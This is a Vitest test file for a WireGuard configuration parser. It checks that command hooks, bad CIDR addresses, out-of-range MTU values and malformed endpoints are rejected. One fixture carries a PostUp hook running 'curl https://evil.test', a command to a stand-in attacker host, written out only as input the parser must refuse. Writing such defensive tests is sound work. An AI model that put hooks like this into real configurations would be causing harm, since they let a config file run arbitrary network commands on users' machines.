import { describe, expect, it } from 'vitest';
import { parseWireGuardConfig } from '../../src/services/vpn/WireGuardConfig';

const validKey = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';

describe('parseWireGuardConfig', () => {
  it('parses a safe configuration without command hooks', () => {
    const result = parseWireGuardConfig(`[Interface]\nPrivateKey = ${validKey}\nAddress = 10.0.0.2/32\nDNS = 10.0.0.1\n\n[Peer]\nPublicKey = ${validKey}\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example:51820`);
    expect(result.errors).toEqual([]);
    expect(result.config?.peers[0].allowedIPs).toEqual(['0.0.0.0/0']);
  });

  it('rejects executable hooks', () => {
    const result = parseWireGuardConfig(`[Interface]\nPrivateKey = ${validKey}\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = ${validKey}\nAllowedIPs = 0.0.0.0/0\nPostUp = curl https://evil.test`);
    expect(result.errors.some((error) => error.includes('hooks'))).toBe(true);
    expect(result.config).toBeUndefined();
  });

  it('requires a peer and a private key', () => {
    const result = parseWireGuardConfig('[Interface]\nAddress = 10.0.0.2/32');
    expect(result.errors.length).toBeGreaterThan(0);
  });

  it('rejects unsafe network values before any connection can be attempted', () => {
    const result = parseWireGuardConfig(`[Interface]\nPrivateKey = ${validKey}\nAddress = 999.0.0.1/99\nMTU = 100\nPostUp = ip route add default\n\n[Peer]\nPublicKey = ${validKey}\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example:not-a-port`);
    expect(result.config).toBeUndefined();
    expect(result.errors).toEqual(expect.arrayContaining([
      'Командные hooks в конфигурации WireGuard запрещены.',
      'Interface.Address содержит неверный CIDR.',
      'Interface.MTU должен быть в диапазоне 576–65535.',
      'Endpoint Peer имеет неверный формат.',
    ]));
  });
});
